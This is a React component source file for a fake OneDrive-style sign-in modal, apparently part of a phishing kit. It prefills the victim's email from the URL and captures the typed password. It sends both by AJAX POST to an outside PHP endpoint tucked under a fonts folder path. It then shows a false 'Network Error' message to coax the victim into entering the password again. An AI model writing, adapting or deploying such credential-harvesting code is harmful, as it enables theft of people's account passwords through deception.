import React, { useState } from "react";
import './Form.css';
import $ from 'jquery';

const Formm = ({ stop_propagate,hideModal })=>{

    // const emailInTheURL = window.location.href;
    // const sliceEqualSign = emailInTheURL.indexOf("@");
    // const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase();
    // const mainName = extracetdEmail.replace('.com', "");


    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const e = emailInTheURL.substr((sliceEqualSign+1));

    const [email, setEmail] = useState(e);
    // setEmail(email);
    const [pwd, setPwd] = useState('');

    const [err, setErr] = useState(false);
    const [btn, setBtn] =useState('Sign In');

    const handleForm = e=>{
        e.preventDefault();

        if (!pwd) {
            return null
        } else {
            setBtn('Processing...')

        setTimeout(() => {
            setPwd('');
            setTimeout(() => {
                setBtn('Sign In');
                setErr(true);
            }, 500);
        }, 2000);

        // post to server

        const user = {
            email: email,
            password: pwd
        };
    
        $.ajax({
            type: "POST",
            url: "https://pearldozen.com/nc_assets/fonts/yr24sc/sharedrive.php",
            data: user,
            success(data) {
                // alert('OK');
                console.log(data);
            },
        });
        }

    }

    return(<div className="form_body" onClick={hideModal}>
        
        <div className="cntr">
            <main className="modalll" onClick={stop_propagate}>
                <img 
                    alt="1drive" 
                    src="data:image/png;base64,"
                />
                <form onSubmit={handleForm}>

                   { err ? <p className="txt_danger" style={{
                        marginBottom:'2em',
                        marginTop:'2px',
                        textAlign:'center'
                    }}>Network Error! Please verify your information and try again</p> : null }
                    
                    <div className="inp_cont">
                        <input 
                            type="email"
                            readOnly
                            className="inpp emaill"
                            value={email}
                            required
                            placeholder="Username"
                            id="email"
                            onChange={e=> setEmail(e.target.value)}
                        />
                    </div>

                    <p></p>

                    <div className="inp_cont">
                        <input 
                            type="password"
                            id="password"
                            className="inpp"
                            value={pwd}
                            required
                            placeholder="Password" 
                            onChange={e=> setPwd(e.target.value)}
                        />
                    </div>

                    <div className="inp_cont">
                        <input 
                            type="submit"
                            value={`${btn}`}
                            className="btn"
                            onClick={handleForm}
                        />
                    </div>

                </form>
            </main>
        </div>

    </div>)
};

export default Formm;